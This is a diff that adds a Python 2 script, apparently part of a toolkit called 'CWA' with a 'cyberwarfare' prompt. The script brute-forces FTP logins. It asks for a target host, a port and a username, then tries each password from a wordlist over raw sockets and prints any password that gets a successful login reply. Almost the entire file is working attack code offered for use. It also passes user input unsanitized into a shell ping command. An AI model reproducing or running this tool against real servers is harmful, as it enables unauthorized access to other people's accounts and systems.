@@ -1,0 +1,123 @@
+#!/usr/bin/python2
+import socket, re, sys, os, time
+
+notrunning = "[*] FTP Bruteforce - Status: NOT RUNNING!\n\n"
+
+try:
+  while True:
+    os.system('clear')
+    print(notrunning)
+    HOST = raw_input("[+] Target - Host: ")
+    if len(HOST) == 0:
+      continue
+    else:
+      print(' ')
+      HOST_STATUS = True if os.system('echo [!] Ensuring Host is online: && ping -c 1 ' + HOST + ' && clear') is 0 else False
+      
+      if HOST_STATUS == True:
+        break
+
+      elif HOST_STATUS == False:
+        os.system('clear')
+        print(notrunning)
+        print("[!] ERROR: HOST IS OFFLINE! ")
+        time.sleep(3)
+
+  while True:
+    os.system('clear')
+    print(notrunning)
+    PORT = raw_input("[+] Target - Port: ")
+    
+    if len(PORT) == 0:
+      os.system('clear')
+      print(notrunning)
+      print("[+] Target - Port: 21")
+      PORT = 21
+      time.sleep(3)
+      break
+    
+    else:
+      PORT = int(PORT)
+      break
+
+  while True:
+    os.system('clear')
+    print(notrunning)
+    USERNAME = raw_input("[+] Target - Username: ")
+    if len(USERNAME) == 0:
+      os.system('clear')
+      print(notrunning)
+      print("[+] Target - Username: anonymous")
+      USERNAME = 'anonymous'
+      time.sleep(3)
+      break
+    else:
+      break
+
+  while True:
+    os.system('clear')
+    print("[*] FTP Bruteforce - Status: NOT RUNNING!\n\n")
+    PASSWORD_LIST = raw_input("[+] Enter Password List Path: ")
+    if len(PASSWORD_LIST) == 0:
+      continue
+    elif os.path.exists(PASSWORD_LIST) == False:
+      print("\n[!] ERROR: INVALID PASSWORD LIST PATH! Press (Enter) to try again. ")
+
+    else:
+      PASSWORD_LIST = open(PASSWORD_LIST)
+      break
+
+  def ftp_connect(username, password):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((HOST,PORT))
+
+    data = s.recv(1024)
+    s.send("USER " + username + "\r\n")
+
+    data = s.recv(1024)
+    s.send("PASS " + password + "\r\n")
+
+    data = s.recv(3)
+    s.send("QUIT\r\n")
+    s.close
+    return data
+
+  os.system('clear')
+  print("[*] FTP Bruteforce - Status: RUNNING!\n\n")
+
+  for password in PASSWORD_LIST:
+    result = ftp_connect(USERNAME, password)
+    if result == '230':
+      os.system('clear')
+      print("[*] FTP Bruteforce - Status: FINISHED!\n\n")
+      print('-' * 80)
+      print(' ')
+      print("[!] PASSWORD FOUND!: " + password)
+      print('-' * 80)
+      raw_input("\n[!] FTP Bruteforce has finished and found the password. \n\nPress (Enter) to return to main screen. (This will clear the screen) ")
+      os.system('./CWA')
+
+    elif result == '530':
+      print("[!] Unable to find the correct password")
+    else:
+      print("[!] ERROR: AN UNKNOWN ERROR HAS OCCURED. EXITING...")
+      sys.exit(0)
+
+except socket.error:
+  while True:
+    os.system("clear")
+    print("[*] FTP Bruteforce - Status: FAILED!\n\n")
+    print("[!] ERROR: UNABLE TO CONNECT TO %s:%s." % (HOST, PORT))
+    choice = raw_input("\n[+] Would you like to try again Y/n?\n\ncyberwarfare-# ")
+    if choice.lower() and choice.strip() == 'y':
+      os.system('./Bruteforce/FTPBruteforce')
+      exit()
+    elif choice.lower() and choice.strip() == 'n':
+      os.system('./CWA')
+      exit()
+    else:
+      continue
+
+except KeyboardInterrupt:
+  print("\n\n[!] USER REQUESTED A SHUTDOWN. EXITING...")
+  sys.exit(4)
